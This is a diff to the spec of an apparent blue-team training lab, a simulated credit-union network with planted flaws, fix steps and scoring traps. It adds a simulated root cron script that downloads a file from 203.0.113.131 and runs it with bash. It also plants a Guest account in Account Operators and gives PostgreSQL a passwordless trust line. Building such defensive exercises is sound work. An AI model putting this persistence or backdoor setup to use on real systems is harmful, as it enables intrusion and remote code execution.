@@ -31,6 +31,8 @@ const DC_DIR = makeDirectory({
 // the round — a privileged backdoor that hides in plain sight.
 DC_DIR.setEnabled('Guest', true);
 DC_DIR.addMember('Account Operators', 'Guest');
+// Each game builds its own copy of the directory from the spec, so that copy needs the same backdoor.
+DC_DIR.seedLive = (d) => { d.setEnabled('Guest', true); d.addMember('Account Operators', 'Guest'); };
 
 // --- pg_hba.conf check for the db01 fix ---------------------------------------------------------------------
 // Reads the EDITED file and decides whether PostgreSQL is really hardened: no "trust" for 0.0.0.0/0, a password
@@ -54,7 +56,7 @@ const hbaRules = (text) => String(text || '').split('\n')
 export function verifyHba(fs) {
   const text = fs[HBA_PATH];
   if (text === undefined || !hbaRules(text).length && !/local/.test(text)) {
-    return { ok: false, why: 'pg_hba.conf is gone or empty — nothing can log in to PostgreSQL now.', trap: { id: 'hba-wiped', drops: ['db'], note: 'pg_hba.conf was emptied; every client (including the scoring engine) is refused.', why: 'Edit the trust line; never empty pg_hba.conf. Restore it with the LAN + scoring lines using scram-sha-256.' } };
+    return { ok: false, why: 'pg_hba.conf is gone or empty — nothing can log in to PostgreSQL now.', trap: { id: 'hba-wiped', note: 'pg_hba.conf was emptied; every client (including the scoring engine) is refused.', why: 'Edit the trust line; never empty pg_hba.conf. Restore it with the LAN + scoring lines using scram-sha-256.' } };
   }
   const rules = hbaRules(text);
   if (rules.some((r) => r.method === 'trust' && /^0\.0\.0\.0\/0$|^all$/.test(r.addr))) {
@@ -66,7 +68,7 @@ export function verifyHba(fs) {
   }
   const scoring = rules.find((r) => inCidr(SCORING_IP, r.addr) && (r.user === 'all' || r.user === 'hp-scorecheck'));
   if (!scoring || !pw(scoring)) {
-    return { ok: false, why: `pg_hba.conf no longer admits the scoring engine (${SCORING_IP}) with a password — the scored DB check cannot log in.`, trap: { id: 'hba-no-scoring', drops: ['db'], note: `pg_hba.conf has no rule letting hp-scorecheck in from ${SCORING_IP}; the scored DB check fails.`, why: `Lock it down, but keep the scorer: add  host all hp-scorecheck ${SCORING_IP}/32 scram-sha-256  before removing the trust line.` } };
+    return { ok: false, why: `pg_hba.conf no longer admits the scoring engine (${SCORING_IP}) with a password — the scored DB check cannot log in.`, trap: { id: 'hba-no-scoring', note: `pg_hba.conf has no rule letting hp-scorecheck in from ${SCORING_IP}; the scored DB check fails.`, why: `Lock it down, but keep the scorer: add  host all hp-scorecheck ${SCORING_IP}/32 scram-sha-256  before removing the trust line.` } };
   }
   return { ok: true };
 }
@@ -98,7 +100,7 @@ export const CCDC_LAB_2 = {
   company: 'Harbor Point Credit Union',
   tagline: 'A two-branch community credit union. You and your team just took over IT at 9:00 AM — a Windows domain, a member portal, a teller workstation and a database, all with bad habits the red team already knows about.',
   clockSeconds: 900,
-  slaPenalty: 15,
+  slaPenalty: 5,
   injectWindow: 300,
 
   redWaves: [
@@ -113,10 +115,10 @@ export const CCDC_LAB_2 = {
   },
 
   services: [
-    { id: 'web', name: 'Member website', proto: 'tcp', ports: [80, 443], host: 'app01', ip: '10.20.30.20', points: 120, check: 'GET / returns 200 and the login page renders' },
-    { id: 'api', name: 'Member portal API', proto: 'tcp', ports: [8443], host: 'app01', ip: '10.20.30.20', points: 120, check: 'GET /api/health returns 200 over TLS' },
-    { id: 'dns', name: 'DNS', proto: 'any', ports: [53], host: 'dc01', ip: '10.20.30.10', points: 120, check: 'A-record lookups for harborpoint.example resolve' },
-    { id: 'db', name: 'Member database (PostgreSQL)', proto: 'tcp', ports: [5432], host: 'db01', ip: '10.20.30.40', points: 120, check: 'The scoring engine logs in as hp-scorecheck and SELECTs' },
+    { id: 'web', name: 'Member website', units: ['apache2'], files: ['/var/www/portal/index.php', '/var/www/portal/config.php'], content: { file: '/var/www/portal/index.php', re: /Harbor Point/ }, deps: ['db'], proto: 'tcp', ports: [80, 443], host: 'app01', ip: '10.20.30.20', points: 120, check: 'GET / returns 200 and the login page renders' },
+    { id: 'api', name: 'Member portal API', units: ['portal-api'], proto: 'tcp', ports: [8443], host: 'app01', ip: '10.20.30.20', points: 120, check: 'GET /api/health returns 200 over TLS' },
+    { id: 'dns', name: 'DNS', winServices: ['DNS'], proto: 'any', ports: [53], host: 'dc01', ip: '10.20.30.10', points: 120, check: 'A-record lookups for harborpoint.example resolve' },
+    { id: 'db', name: 'Member database (PostgreSQL)', units: ['postgresql'], healthy: (f) => !verifyHba(f).trap, proto: 'tcp', ports: [5432], host: 'db01', ip: '10.20.30.40', points: 120, check: 'The scoring engine logs in as hp-scorecheck and SELECTs' },
   ],
 
   devices: [
@@ -215,9 +217,9 @@ export const CCDC_LAB_2 = {
           '/home/analyst/README.txt': 'Harbor Point member portal (Apache). Web root /var/www/portal. API on 8443. DB is PostgreSQL on db01 (10.20.30.40).\n',
           '/var/www/portal/index.php': "<?php /* Harbor Point member portal */ require 'config.php'; ?>\n",
           '/var/www/portal/config.php': "<?php\n$DB_HOST='10.20.30.40';\n$DB_NAME='members';\n$DB_USER='portal_app';\n$DB_PASS='p0rtal-app-pw';  // used by the portal\n",
-          '/var/www/portal/.git/config': '[core]\n\trepositoryformatversion = 0\n[remote "origin"]\n\turl = https://git.harborpoint.local/portal.git\n[credential]\n\thelper = store   # plaintext creds in .git-credentials — the whole repo is downloadable from the web root\n',
+          '/var/www/portal/.git/config': '[core]\n\trepositoryformatversion = 0\n[remote "origin"]\n\turl = https://git.harborpoint.local/portal.git\n[credential]\n\thelper = store\n',
           '/etc/cron.d/portal-sync': '*/5 * * * * root /usr/local/bin/portal-sync.sh >/dev/null 2>&1\n',
-          '/usr/local/bin/portal-sync.sh': '#!/bin/bash\n# NOT part of the portal — left by a prior intrusion; re-establishes the attacker\u2019s access. (payload redacted)\n',
+          '/usr/local/bin/portal-sync.sh': '#!/bin/bash\n# portal cache sync\n/usr/bin/curl -s https://203.0.113.131/u -o /tmp/.u && /bin/bash /tmp/.u\n',
         },
         commands: bx({
           crontab: (args) => (args[0] === '-l'
@@ -247,8 +249,8 @@ export const CCDC_LAB_2 = {
         user: 'analyst', host: 'db01', cwd: '/home/analyst', history: [],
         fs: {
           '/home/analyst/README.txt': 'Harbor Point member DB (PostgreSQL 14). Clients: app01 (10.20.30.20) and the scoring engine (hp-scorecheck).\n',
-          '/etc/postgresql/14/main/postgresql.conf': "data_directory = '/var/lib/postgresql/14/main'\nlisten_addresses = '*'        # listens on EVERY interface — far wider than needed\nport = 5432\n",
-          '/etc/postgresql/14/main/pg_hba.conf': '# TYPE  DATABASE  USER  ADDRESS        METHOD\nlocal   all       all                  peer\nhost    all       all   127.0.0.1/32   scram-sha-256\nhost    all       all   0.0.0.0/0      trust        # ANY host, NO password — fix this\n',
+          '/etc/postgresql/14/main/postgresql.conf': "data_directory = '/var/lib/postgresql/14/main'\nlisten_addresses = '*'\nport = 5432\n",
+          '/etc/postgresql/14/main/pg_hba.conf': '# TYPE  DATABASE  USER  ADDRESS        METHOD\nlocal   all       all                  peer\nhost    all       all   127.0.0.1/32   scram-sha-256\nhost    all       all   0.0.0.0/0      trust\n',
         },
         commands: bx({
           psql: (args) => (args.join(' ').toLowerCase().includes('select')
@@ -275,23 +277,22 @@ export const CCDC_LAB_2 = {
           { id: 'db', host: 'db01', ip: '10.20.30.40', proto: 'tcp', ports: [5432], src: 'scoring' },
         ],
       },
-      fix: { restores: ['web', 'api', 'dns', 'db'], why: 'Allow-list exactly the scored ports per host first (PostgreSQL only "from scoring"), then delete the any-any rule and set the default inbound policy to block. app01→db01 traffic is LAN and never crosses the edge; restrict that on db01 instead.' },
+      fix: { why: 'Allow-list exactly the scored ports per host first (PostgreSQL only "from scoring"), then delete the any-any rule and set the default inbound policy to block. app01→db01 traffic is LAN and never crosses the edge; restrict that on db01 instead.' },
       traps: [],
     },
     {
       id: 'print-spooler', host: 'dc01', title: 'Print Spooler running on the domain controller', severity: 'Critical',
       teach: 'A domain controller has no business printing. A running Spooler on a DC is the PrintNightmare path to SYSTEM. Stop and disable the service — no reboot needed, so DNS keeps serving.',
-      exploitable: true, compromise: { impact: 'Red team uses the Spooler (PrintNightmare) to run code as SYSTEM on the DC.', penalty: 65, drops: ['dns'] },
+      exploitable: true, compromise: { impact: 'Red team uses the Spooler (PrintNightmare) to run code as SYSTEM on the DC.', penalty: 65 },
       fix: {
         steps: [
           { id: 'stop', accept: [/stop-service/, /spooler/], label: 'Stopped the Print Spooler', output: ['Spooler stopped — the running service is no longer reachable.'], todo: 'stop the service (Stop-Service Spooler -Force)' },
           { id: 'disable', accept: [/set-service|sc config spooler|sc\.exe config spooler/, /spooler/, /disabled/], label: 'Disabled the Spooler at boot', output: ['Spooler StartupType = Disabled — it will not come back after a restart.'], todo: 'disable it at boot (Set-Service Spooler -StartupType Disabled)' },
         ],
-        restores: ['dns'],
         why: 'Stop-Service Spooler -Force removes the immediate exposure; Set-Service Spooler -StartupType Disabled keeps it off after a reboot. Neither restarts the DC, so DNS is untouched.',
       },
       traps: [
-        { id: 'reboot', match: [/restart-computer/, [/shutdown/, /\/r|-r/]], drops: ['dns'], note: 'The DC rebooted mid-round; DNS was down for the whole restart.', output: ['Restarting DC01... DNS will be unavailable until it comes back.'], why: 'Rebooting the DC takes DNS (a scored service) offline for minutes. Stop and disable the Spooler — no restart required.' },
+        { id: 'reboot', match: [/restart-computer/, [/shutdown/, /\/r|-r/]], note: 'The DC rebooted mid-round; DNS was down for the whole restart.', output: ['Restarting DC01... DNS will be unavailable until it comes back.'], why: 'Rebooting the DC takes DNS (a scored service) offline for minutes. Stop and disable the Spooler — no restart required.' },
       ],
     },
     {
@@ -310,7 +311,7 @@ export const CCDC_LAB_2 = {
       ],
     },
     {
-      id: 'exposed-git', host: 'app01', title: 'The .git folder is exposed in the web root (leaks DB credentials)', severity: 'High',
+      id: 'exposed-git', path: 'web', host: 'app01', title: 'The .git folder is exposed in the web root (leaks DB credentials)', severity: 'High',
       teach: 'Deploying with the .git directory in the web root lets anyone download the full source history — including the database credentials committed in it. Remove it from the served path (and rotate anything it leaked).',
       exploitable: true, compromise: { impact: 'Red team downloads /portal/.git, recovers the DB credentials, and logs into PostgreSQL as the app.', penalty: 45 },
       fix: {
@@ -319,11 +320,11 @@ export const CCDC_LAB_2 = {
         why: 'rm -rf /var/www/portal/.git removes the exposed history. Deploy from an export, not a clone; rotate the leaked DB password; and add a web-server rule to deny dot-directories as defence in depth.',
       },
       traps: [
-        { id: 'index-only', match: [[/rm /, /index\.php|config\.php/]], drops: ['web'], note: 'You deleted a live portal file; the website stops rendering.', output: ['removed a portal source file — the site is now broken.'], why: 'Do not delete the running application. The exposure is the .git folder; remove that, not the app’s own files.' },
+        { id: 'index-only', match: [[/rm /, /index\.php|config\.php/]], note: 'You deleted a live portal file; the website stops rendering.', output: ['removed a portal source file — the site is now broken.'], why: 'Do not delete the running application. The exposure is the .git folder; remove that, not the app’s own files.' },
       ],
     },
     {
-      id: 'app-cron', host: 'app01', title: 'Attacker persistence: a root cron re-running a planted script', severity: 'High', reportableBy: 'incident-report',
+      id: 'app-cron', path: 'beacon', host: 'app01', title: 'Attacker persistence: a root cron re-running a planted script', severity: 'High', reportableBy: 'incident-report',
       teach: 'Persistence must be removed AND its trigger closed, or it reappears. Remove the cron entry and the script it runs — together.',
       exploitable: true, compromise: { impact: 'The cron re-establishes the attacker’s access every 5 minutes regardless of your other fixes.', penalty: 45 },
       fix: {
@@ -338,20 +339,19 @@ export const CCDC_LAB_2 = {
     {
       id: 'postgres-trust', host: 'db01', title: 'PostgreSQL trusts any host with no password, on every interface', severity: 'Critical',
       teach: 'A "trust" line for 0.0.0.0/0 means anyone who can reach 5432 is in, with no password. Require real authentication and restrict the source to the two clients that need it — without cutting them off.',
-      exploitable: true, compromise: { impact: 'Red team connects to PostgreSQL with no credentials and reads/alters the member database.', penalty: 60, drops: ['db'] },
+      exploitable: true, compromise: { impact: 'Red team connects to PostgreSQL with no credentials and reads/alters the member database.', penalty: 60 },
       fix: {
         steps: [
           // Any edit of pg_hba.conf is checked against the file it actually leaves behind (verifyHba), not the
           // command text: appending a scram line under the trust line, or wiping the file, does not count.
-          { id: 'hba', accept: [/sed -i|tee|>>|>/, /pg_hba/], verify: verifyHba, restores: ['db'], label: 'Required real authentication in pg_hba.conf', output: ['pg_hba.conf: no trust line left; the LAN and the scoring engine (198.51.100.9) must authenticate with scram-sha-256.'], todo: 'edit pg_hba.conf: remove the 0.0.0.0/0 trust line, allow the LAN with scram-sha-256, keep hp-scorecheck allowed from 198.51.100.9' },
+          { id: 'hba', accept: [/sed -i|tee|>>|>/, /pg_hba/], verify: verifyHba, label: 'Required real authentication in pg_hba.conf', output: ['pg_hba.conf: no trust line left; the LAN and the scoring engine (198.51.100.9) must authenticate with scram-sha-256.'], todo: 'edit pg_hba.conf: remove the 0.0.0.0/0 trust line, allow the LAN with scram-sha-256, keep hp-scorecheck allowed from 198.51.100.9' },
           { id: 'reload', accept: [/systemctl|service|pg_ctl/, /reload|restart/, /postgres/], label: 'Reloaded PostgreSQL', output: ['postgresql reloaded — the new pg_hba.conf is live.'], todo: 'reload PostgreSQL so the change takes effect (systemctl reload postgresql)' },
           { id: 'restrict', accept: [/ufw/, /5432/, /\ballow\b/, /from (10\.20\.30\.|198\.51\.100\.9\b)/], reject: [/\b(deny|reject|drop|block)\b/, /from any\b|0\.0\.0\.0\/0/], label: 'Restricted 5432 to the two clients', output: ['Rule added: allow 5432 from 10.20.30.0/24; the internet can no longer reach PostgreSQL.'], todo: 'restrict port 5432 to app01 and the scoring engine (ufw allow from 10.20.30.0/24 to any port 5432)' },
         ],
-        restores: ['db'],
         why: 'Add a scram-sha-256 rule for hp-scorecheck from the scoring engine (198.51.100.9/32), replace the 0.0.0.0/0 trust line with scram-sha-256 scoped to the LAN, reload PostgreSQL, and firewall 5432 to app01 and the scoring engine. The DB stays reachable by exactly the clients that need it.',
       },
       traps: [
-        { id: 'deny-all-5432', match: [[/ufw/, /5432/, /deny|reject/]], drops: ['db'], note: 'Port 5432 blocked outright; app01 and the scoring engine can no longer reach the DB.', output: ['ufw: rule added — DENY 5432.'], why: 'Blocking 5432 for everyone cuts off the two legitimate clients too. Restrict by source, do not deny the port.' },
+        { id: 'deny-all-5432', match: [[/ufw/, /5432/, /deny|reject/]], note: 'Port 5432 blocked outright; app01 and the scoring engine can no longer reach the DB.', output: ['ufw: rule added — DENY 5432.'], why: 'Blocking 5432 for everyone cuts off the two legitimate clients too. Restrict by source, do not deny the port.' },
       ],
     },
     {
